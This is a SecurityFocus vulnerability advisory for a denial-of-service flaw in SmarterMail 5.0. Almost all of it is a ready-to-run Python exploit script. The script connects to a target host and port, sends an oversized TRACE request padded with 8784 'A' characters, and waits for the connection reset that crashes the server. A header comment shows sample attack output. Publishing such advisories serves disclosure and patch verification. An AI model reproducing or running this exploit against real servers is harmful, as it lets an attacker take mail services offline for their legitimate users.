source: http://www.securityfocus.com/bid/28610/info

SmarterTools SmarterMail is prone to a denial-of-service vulnerability when handling specially crafted HTTP GET, HEAD, PUT, POST, and TRACE requests. When the server eventually resets the request connection, it will crash.

Remote attackers can exploit this issue to deny service to legitimate users.

SmarterMail 5.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/python
##########################################################################
#
# SmarterMail Web Server 5.0 DoS exploit
# Tested on version 5.0.2999, OS: Windows XPSP2 English
# Tested with GET,HEAD,PUT,POST,TRACE
#
# Bug discovered by Matteo Memelli aka ryujin
# http://www.gray-world.net http://www.be4mind.com
#
##########################################################################
#
# bt ~ # ./smartermail_dos.py -H 192.168.1.245 -P 9998
# [+] Connecting to 192.168.1.245 on port 9998
# [+] Starting DoS attack, it can take some minutes...
# [+] Evil buf sent!
# [+] Now we must wait for a connection reset to crash the server...
# [+] Server Di3d:  Connection reset by peer
# [+] The attack took 113 secs
#
##########################################################################

from socket import *
from optparse import OptionParser
import sys, time

usage =  "%prog -H TARGET_HOST -P TARGET_PORT [-c COMMAND]"
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string",
                  action="store", dest="HOST",
                  help="Target Host")
parser.add_option("-P", "--target_port", type="int",
                  action="store", dest="PORT",
                  help="Target Port")
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
if not (HOST and PORT):
   parser.print_help()
   sys.exit()

payload = 'A'*8784
print "[+] Connecting to %s on port %d" % (HOST, PORT)
print "[+] Starting DoS attack, it can take some minutes..."
timestart = time.time()
s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
s.send('TRACE ' + payload+"\r\n\r\n")
print "[+] Evil buf sent!"
print "[+] Now we must wait for a connection reset to crash the 
server..."

# IF WE DONT WAIT FOR A CONNECTION RESET THE SERVER WONT CRASH
try:
   data=s.recv(1024)
except error,e:
   print "[+] Server Di3d: ", e[1]
   print "[+] The attack took %d secs" % int(time.time() - timestart)
else:
   print "[-] Attack was not successful!" 
   s.close()